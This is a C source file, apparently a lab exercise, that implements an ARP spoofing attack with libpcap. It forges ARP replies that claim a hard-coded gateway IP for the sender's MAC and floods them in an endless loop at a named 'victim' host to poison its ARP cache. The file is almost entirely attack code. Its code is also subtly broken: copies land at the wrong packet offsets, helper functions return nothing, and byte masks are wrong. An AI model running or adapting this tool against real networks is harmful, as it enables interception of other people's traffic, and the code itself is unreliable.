#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <pcap.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <netinet/ip.h> 
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#pragma pack(1)

#define MAXLINE 256		//for getMyMacAddr by ifconfig command Line

struct ether_h
{
  u_char ether_dst_mac[6];  /*dst_mac 6byte*/
  u_char ether_src_mac[6];  /*src_mac 6byte*/  
  u_short ether_type; //2byte
};


struct arp_h {
	u_short hType; /*hardware type*/
	u_short protocl; /*protocol*/
	u_char hSize; /*hardware size*/
	u_char pSize; /*protocol size*/
	u_short opcode; /*opcode*/
	u_char sndMacAddr[6]; /*sender mac address*/
	struct in_addr sndIP; /*sender ip address*/
	u_char tarMacAddr[6]; /*target mac address*/
	struct in_addr tarIP; /*target ip address*/
};


void getVictimMac(u_char* vicMacAddr, uint32_t vicIPAddr, char* device){
	//this function is for get arp packet and parse victim mac addr
	struct ether_h* eHeader;
    struct arp_h*   aHeader;

	int i;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 60, errbuf);
	if (handle == NULL) {
    	fprintf(stderr, "couldn't open device %s: %s\n", device, errbuf);
    	return;
    }

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)           //use when you using loop
            continue;
        if (res == -1 || res == -2) 
            break;

        eHeader = (struct ether_h *)packet;

        if ( ntohs(eHeader->ether_type) == ETHERTYPE_ARP){
            //these things for print what in packet
            
            /*printf("--------------real Thing-----------------\n");
            for(i = 14 ; i < 42; i++){
                printf("%2X ",packet[i]);
            }
            printf("--------------real end----------------\n");
            packet += sizeof(struct ether_h);*/
            aHeader = (struct arp_h *)packet;

            /*printf("%x\n",ntohs(aHeader->hType));
            printf("%x\n",ntohs(aHeader->protocl));
            printf("%x\n",aHeader->hSize);
            printf("%x\n",aHeader->pSize);
            printf("%x\n",ntohs(aHeader->opcode));
            //printf("%x\n",aHeader->sndMacAddr);
            for(i = 0; i < 6; i++){
                printf("%2X ",aHeader->sndMacAddr[i]);
            }
            printf("\n%x\n",ntohl(aHeader->sndIP.s_addr));
            //printf("%x\n",aHeader->tarMacAddr);
            for(i = 0; i < 6; i++){
                printf("%2X ",aHeader->tarMacAddr[i]);
            }
            printf("\n%x\n",ntohl(aHeader->tarIP.s_addr));*/
            
            if( ntohs(aHeader->opcode) == 0x02 && 
                ntohl(aHeader->sndIP.s_addr) == vicIPAddr){
                printf("catch!!\n");
                vicMacAddr = (u_char *)aHeader->sndMacAddr;
                return;
            }
            
        }
    }

}  

void getMyMacAddr(u_char* myMacAddr, char* device){
    //this function for getMyMac Address
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, device);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        myMacAddr = (u_char*)s.ifr_addr.sa_data;
    }

}




int main(int argc, char **argv){
    struct ether_h * eHeader;
    struct arp_h * aHeader;

    char *dev = argv[1];

	u_char myMacAddr[6];
	u_char vicMacAddr[6];

    uint32_t myIP = (uint32_t)inet_addr("192.168.152.138");
    uint32_t victimIP = (uint32_t)inet_addr("192.168.152.129");

	pcap_t *packetPointer;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char packet[100];
	int i;

    getMyMacAddr(myMacAddr, dev);

	if(argc != 2){
		printf("usage: %s interface)",argv[0]);
		return 0;
	}

	if( (packetPointer = pcap_open_live(argv[1], 100, PCAP_WARNING_PROMISC_NOTSUP,
					1000,
					errbuf)) == NULL){
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by winPcap\n", argv[1]);
		return 0;
	}
	


	// set mac destination broadcast
	packet[0] = 0xFF;
	packet[1] = 0xFF;
	packet[2] = 0xFF;
	packet[3] = 0xFF;
	packet[4] = 0xFF;
	packet[5] = 0xFF;
	
	// set mac source to mymacAddr
	packet[6] = 0x00;
    packet[7] = 0x0C;
    packet[8] = 0x29;
    packet[9] = 0xBF;
    packet[10] = 0x0C;
    packet[11] = 0x94;

    //ether type (arp)
    packet[12] = 0x08;
    packet[13] = 0x06;

    //arp header H/W type 1
    packet[14] = 0x00;
    packet[15] = 0x01;

    //arp header protocol type 1
    packet[16] = 0x08;
    packet[17] = 0x00;

    //arp header H/W address length 6 4
    packet[18] = 0x06;
    packet[19] = 0x04;

    //arp header H/W type opCode 1
    packet[20] = 0x00;
    packet[21] = 0x01;

    //arp header Source MAC addr(MY MAC)
    packet[22] = 0x00;
    packet[23] = 0x0C;
    packet[24] = 0x29;
    packet[25] = 0xBF;
    packet[26] = 0x0C;
    packet[27] = 0x94;

    //arp header Source IP(gateWay ip Addr) 
    packet[28] = 0xC0;
    packet[29] = 0xA8;
    packet[30] = 0x98;
    packet[31] = 0x8A;

    //arp header Destination Mac Addr(Victim Mac)(Init broad)
    packet[32] = 0xFF;
    packet[33] = 0xFF;
    packet[34] = 0xFF;
    packet[35] = 0xFF;
    packet[36] = 0xFF;
    packet[37] = 0xFF;

    //arp header Destination IP(Victiom IP Addr)
    packet[38] = 0xC0;
    packet[39] = 0xA8;
    packet[40] = 0x98;
    packet[41] = 0x81;

	if( pcap_sendpacket(packetPointer,packet, 42) != 0){
		fprintf(stderr,"\nError sending the packet : \n", pcap_geterr(packetPointer));
		return 0;
	}

    //getVictimMac(vicMacAddr, 0xC0A89881, dev);

    vicMacAddr[0] = 0x00;
    vicMacAddr[1] = 0x0C;
    vicMacAddr[2] = 0x29;
    vicMacAddr[3] = 0xF7;
    vicMacAddr[4] = 0x21;
    vicMacAddr[5] = 0xFC;


    memcpy(packet, vicMacAddr, 6);
    /*packet[0] = ((int)vicMacAddr & 0xF00000) >> 40;
    packet[1] = (vicMacAddr & 0x0F0000) >> 32;
    packet[2] = (vicMacAddr & 0x00F000) >> 24;
    packet[3] = (vicMacAddr & 0x000F00) >> 16;
    packet[4] = (vicMacAddr & 0x0000F0) >> 8;
    packet[5] = vicMacAddr & 0x00000F;*/
    
    // set mac source to mymacAddr
    memcpy(packet, myMacAddr, 6);
    /*packet[6] = 0x00;
    packet[7] = 0x0C;
    packet[8] = 0x29;
    packet[9] = 0xBF;
    packet[10] = 0x0C;
    packet[11] = 0x94;*/

    //ether type (arp)
    packet[12] = 0x08;
    packet[13] = 0x06;

    //arp header H/W type 1
    packet[14] = 0x00;
    packet[15] = 0x01;

    //arp header protocol type 1
    packet[16] = 0x08;
    packet[17] = 0x00;

    //arp header H/W address length 6 4
    packet[18] = 0x06;
    packet[19] = 0x04;

    //arp header H/W type opCode 2
    packet[20] = 0x00;
    packet[21] = 0x02;

    //arp header Source MAC addr(MY MAC)
    memcpy(packet, myMacAddr, 6);
    /*packet[22] = 0x00;
    packet[23] = 0x0C;
    packet[24] = 0x29;
    packet[25] = 0xBF;
    packet[26] = 0x0C;
    packet[27] = 0x94;*/

    //arp header Source IP(gateWay ip Addr) 
    packet[28] = 0xC0;
    packet[29] = 0xA8;
    packet[30] = 0x98;
    packet[31] = 0x01;

    //arp header Destination Mac Addr(Victim Mac)(Init broad)
    memcpy(packet, vicMacAddr, 6);
    /*packet[32] = 0xFF;
    packet[33] = 0xFF;
    packet[34] = 0xFF;
    packet[35] = 0xFF;
    packet[36] = 0xFF;
    packet[37] = 0xFF;*/

    //arp header Destination IP(Victiom IP Addr)
    /*packet[38] = 0xC0;
    packet[39] = 0xA8;
    packet[40] = 0x98;
    packet[41] = 0x81;*/

    packet[38] = (u_char)((victimIP & 0xF000) >> 24);
    packet[39] = (u_char)((victimIP & 0x0F00) >> 16);
    packet[40] = (u_char)((victimIP & 0x00F0) >> 8);
    packet[41] = (victimIP & 0x000F);

    while(1){
        if( pcap_sendpacket(packetPointer,packet, 60) != 0){
            fprintf(stderr,"\nError sending the packet : \n", pcap_geterr(packetPointer));
            return 0;
        }
    }
    

	return 0;
}